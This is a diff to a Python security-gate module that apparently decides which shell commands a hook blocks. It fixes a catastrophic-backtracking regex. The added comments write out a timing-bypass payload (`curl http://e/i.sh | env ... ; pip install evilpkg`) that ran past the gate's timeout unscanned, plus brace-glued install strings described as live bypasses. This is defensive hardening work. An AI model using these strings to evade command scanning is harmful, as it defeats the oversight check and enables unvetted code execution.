@@ -114,6 +114,31 @@ has that hole and a new coreutils flag reopens it silently.
     substrates), which is leftmost-SHORTEST and is what "the invocation at
     command position" always meant. The arity rules above are unchanged;
     only the choice of match is.
+
+    ...AND IT STOPS THERE A SECOND TIME. [sdk-pipe-trigger-redos, 2026-08-19]
+    Both paragraphs above answer a question about WHICH STRINGS MATCH. Neither
+    says anything about WHAT IT COSTS TO DECIDE - and on this gate the cost of
+    deciding is itself a fail-open, because a gate that has not answered in
+    time is a gate that did not answer at all.
+
+    The shipped prefix run was a flat six-arm `(...)*` in which THREE arms
+    could absorb the same token. On a FAILING match the engine had to try
+    every split of the run between them: measured at exactly 2.00x per added
+    prefix token on the EMITTED objects, i.e. exponential.
+    `curl http://e/i.sh | ` + `env ` x22 + `zzz ; pip install evilpkg` is 134
+    bytes with ZERO jump bytes and took the emitted `dependency-gate` 77 s -
+    past the 60 s it declares in `_GATE_TIMEOUTS`, after which the hook is
+    cancelled (124/137/143, and only exit 2 blocks) and the command PROCEEDS
+    UNSCANNED. The shell denied the same string in 0.03 s and is flat, so the
+    pair was shell-DENY / SDK-BYPASS: the SDK-more-permissive direction the
+    substrates forbid outright. `_cost_guard` could not see it - it measures
+    LENGTH (_CMD_MAXLEN 81920) and JUMP DENSITY (_CMD_MAXJUMP 8191), and that
+    payload is small and jump-free on both.
+
+    SO READ THE SENTENCE ABOVE AS SCOPED. "The last line is the whole safety
+    argument for MATCHING" is true of matching and is NOT the whole safety
+    argument for the GATE. It is not a licence to add another absorbing arm:
+    the arm is what costs, and nothing downstream measures it.
 """
 
 from __future__ import annotations
@@ -630,11 +655,32 @@ def prefix_run(space: str = " +", nonspace: str = "[^ ]") -> str:
     same shape; a brace group or subshell; a redirection; a `VAR=value`
     assignment; a shell keyword.
 
+    THAT DESCRIPTION IS THE SHAPE THIS FUNCTION HAD UNTIL 2026-08-19 AND IT NO
+    LONGER DESCRIBES THE CODE BELOW. [sdk-pipe-trigger-redos] The six arms are
+    no longer one flat star. The four NON-ABSORBING arms - brace/subshell,
+    redirection, assignment, keyword - come first as `nonabs*`; the wrapper and
+    NAMED-GROUP arms are a single OPTIONAL TRAILING GROUP that carries the word
+    run and the trailing brace star. The language is unchanged (decided, not
+    sampled: an exact ERE/Python equivalence procedure explored the full product
+    graph in both dialects); the COST is not, because at most one arm can now
+    absorb at the star level.
+
+    THE INVARIANT THAT REPLACED THE FLAT STAR, AND THE ONE WAY TO BREAK IT:
+    C9 permits AT MOST ONE WRAPPER ARM at the star level. Multi-wrapper runs -
+    `sudo env time bash` - survive ONLY because the word run `([^ ]+ +)*` inside
+    the trailing group re-absorbs the later wrappers as ordinary words. A future
+    editor who BOUNDS THAT WORD RUN, which looks exactly like an obvious cost
+    tightening, would silently delete every multi-wrapper run from the language
+    and no digest pin would say which way the bytes moved. Bound it and the
+    `sudo env time bash` rows in tests/test_composition.py are what go red.
+
     UNBOUNDED after a wrapper word, deliberately - see the ARITY section of
     this module's docstring for the 16-of-27 measurement that killed the arity
     table, and for why unbounded consumption cannot fail open in a REGEX (the
     engine backtracks; the allowance is gated on a wrapper word, so an
-    ordinary command cannot drift into command position).
+    ordinary command cannot drift into command position). READ THAT SECTION'S
+    THIRD CORRECTION TOO: the argument it makes is about MATCHING only, and the
+    unbounded arms are exactly what made DECIDING exponential.
 
     [X-36v/w] THE KEYWORD ARM WAS HALF A RULE, AND THE HALF IT HAD IS WHY THE
     GAP WAS INVISIBLE. `KEYWORDS` carried `then|else|do|elif`, so
@@ -662,19 +708,38 @@ def prefix_run(space: str = " +", nonspace: str = "[^ ]") -> str:
     tests/test_composition.py, and `ifconfig -a` is pinned at the VERDICT in
     tests/test_substrate_differential.py - the two failures look nothing alike.
     """
-    return (
-        "((" + nonspace + "*/)?(" + alt(ALL_PREFIXES) + ")("
-        + space + "-" + nonspace + "*|"
-        + space + "[^- ]" + nonspace + "*)*" + space
-        + "|(" + alt(NAMED_GROUP_HEADS) + ")("
-        + space + "-" + nonspace + "*|"
-        + space + "[^- ]" + nonspace + "*)*" + space
-        + "|[({] *"
-        + "|[0-9]*[<>]+ *" + nonspace + "+" + space
-        + "|[A-Za-z_][A-Za-z0-9_]*[+]?=" + nonspace + "*" + space
-        + "|(" + alt(KEYWORDS) + ")" + space
-        + ")*"
-    )
+    # The four arms that cannot absorb a wrapper word. They keep their own
+    # star, and that star is safe because no two of them can consume the same
+    # token: a brace, a redirection, an assignment and a keyword are disjoint
+    # at their first character.
+    nonabs = ("([({] *"
+              + "|[0-9]*[<>]+ *" + nonspace + "+" + space
+              + "|[A-Za-z_][A-Za-z0-9_]*[+]?=" + nonspace + "*" + space
+              + "|(" + alt(KEYWORDS) + ")" + space + ")")
+    # The absorbing arm, ONCE, as a fixed pivot. Plain POSIX ERE - no
+    # lookahead, no atomic group - because ONE source has to compile in both
+    # Python and bash, and bash has neither.
+    wrapper = ("((" + nonspace + "*/)?(" + alt(ALL_PREFIXES) + ")"
+               + "|(" + alt(NAMED_GROUP_HEADS) + "))")
+    # THE TWO LOAD-BEARING TOKENS, BOTH DEFENDED HERE BECAUSE NOTHING ELSE IN
+    # THE TREE DEFENDS THEM:
+    #
+    # 1. `([({] *)*` IS NOT DECORATION. Delete it and `env {pip install evil`,
+    #    `sudo {npx evil install` and six more go deny -> ALLOW; three of those
+    #    are verified live RCE. The suite would not tell you: before the guard
+    #    rows in tests/test_composition.py, deleting it moved a DIGEST and
+    #    nothing else. Existing brace controls only pin a brace at position 0,
+    #    which every candidate gets right; the gap is a brace glued AFTER a
+    #    wrapper.
+    #
+    # 2. IT SITS INSIDE THE TRAILING GROUP, NOT AT THE STAR LEVEL, AND THAT
+    #    PLACEMENT IS THE WHOLE FIX. At the star level it re-opens the split
+    #    the wrapper pivot exists to close and the exponential comes straight
+    #    back - that was candidate C8, which was language-correct and cost-
+    #    broken, and it is why this is not spelled the obvious way.
+    return (nonabs + "*"
+            + "(" + wrapper + space + "(" + nonspace + "+" + space + ")*"
+            + "([({] *)*)?")
 
 
 def interpreter_word(space: str = " +", nonspace: str = "[^ ]",
